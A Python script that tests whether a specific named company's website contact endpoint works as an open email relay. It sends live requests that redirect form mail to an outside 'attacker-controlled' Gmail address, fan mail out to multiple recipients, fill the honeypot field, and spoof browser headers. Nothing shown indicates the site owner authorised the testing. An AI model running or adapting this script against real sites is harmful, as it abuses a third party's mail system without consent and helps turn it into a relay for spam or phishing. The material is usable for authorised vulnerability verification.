#!/usr/bin/env python3
"""
Independent verification of the claimed "open email relay" on
POST https://www.infinitycapital.bh/api/send

Differential test: two requests byte-identical EXCEPT the `targets` field.
  A) targets = the address the site itself ships in its config (legit recipient)
  B) targets = an arbitrary third-party mailbox (attacker controlled)
Also: multi-recipient fan-out, honeypot `check` field behaviour, no-auth check.
"""
import json, ssl, sys, time, urllib.parse, urllib.request, urllib.error

URL = "https://www.infinitycapital.bh" + "/api/send"
OUT = "/work/IVRELAY_V4/"

UA = ("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 "
      "(KHTML, like Gecko) Chrome/12" + "2.0.0.0 Safari/537.36")

# mailbox we own for receiving evidence of relayed mail
OWN = "relaytest.iv2026" + "@gmail.com"
SITE_OWN = "info" + "@infinitycapital.bh"


def post(fields, tag, ua=UA, referer="https://www.infinitycapital.bh/contact",
         origin="https://www.infinitycapital.bh", cookie=None):
    body = urllib.parse.urlencode(fields).encode()
    hdrs = {
        "User-Agent": ua,
        "Content-Type": "application/x-www-form-urlencoded",
        "Referer": referer,
        "Origin": origin,
        "Accept": "*/*",
        "Connection": "close",
    }
    if cookie:
        hdrs["Cookie"] = cookie
    req = urllib.request.Request(URL, data=body, headers=hdrs, method="POST")
    t0 = time.time()
    try:
        r = urllib.request.urlopen(req, timeout=45, context=ssl.create_default_context())
        status, rh, raw = r.status, dict(r.headers), r.read()
    except urllib.error.HTTPError as e:
        status, rh, raw = e.code, dict(e.headers), e.read()
    except Exception as e:
        status, rh, raw = -1, {}, str(e).encode()
    dt = time.time() - t0
    rec = {
        "tag": tag, "request_body": body.decode("utf-8", "replace"),
        "status": status, "elapsed_s": round(dt, 2),
        "response_headers": rh, "response_body": raw.decode("utf-8", "replace"),
    }
    with open(OUT + tag + ".json", "w") as f:
        json.dump(rec, f, indent=2)
    print("--- %-28s HTTP %s  (%.2fs)  body=%r" % (tag, status, dt, rec["response_body"][:400]))
    return rec


def base(subj, msg, targets, check=""):
    return {
        "fname": "Verif", "lname": "Bot", "areacode": "973", "tel": "5550000",
        "cname": "Independent Verifier", "subject": subj, "msg": msg,
        "check": check, "targets": targets,
    }


results = {}

# ---- 0. baseline: no auth headers / no cookies / curl-like agent ----
results["anon_curl_ua"] = post(
    base("IV-ANON", "anon no-cookie no-auth test", OWN),
    "00_anonymous_no_cookies", ua="curl/8.5.0",
    referer=None, origin=None, cookie=None)

time.sleep(5)

# ---- A. legitimate / site-configured recipient ----
results["site_own_recipient"] = post(
    base("IV-DIFF-A", "differential A: recipient is the site's own configured mailbox",
         SITE_OWN), "10_diff_A_site_own_recipient")

time.sleep(5)

# ---- B. attacker-controlled third-party recipient (IDENTICAL otherwise) ----
results["attacker_recipient"] = post(
    base("IV-DIFF-B", "differential B: recipient is an arbitrary third-party mailbox",
         OWN), "20_diff_B_attacker_recipient")

time.sleep(5)

# ---- C. honeypot filled with a real value -> still sends? ----
results["honeypot_filled"] = post(
    base("IV-HONEY", "honeypot check field populated with a real value",
         OWN, check="http://bot.example/"), "30_honeypot_check_filled")

time.sleep(5)

# ---- D. multi-recipient fan-out (arbitrary comma separated) ----
results["fanout"] = post(
    base("IV-FANOUT", "fan-out test: multiple arbitrary third-party recipients",
         OWN + ", " + SITE_OWN), "40_multi_recipient_fanout")

with open(OUT + "summary.json", "w") as f:
    json.dump({k: {"status": v["status"], "body": v["response_body"]}
               for k, v in results.items()}, f, indent=2)

print("\n===== SUMMARY =====")
for k, v in results.items():
    print("%-24s HTTP %-4s %s" % (k, v["status"], v["response_body"][:200].replace("\n", " ")))
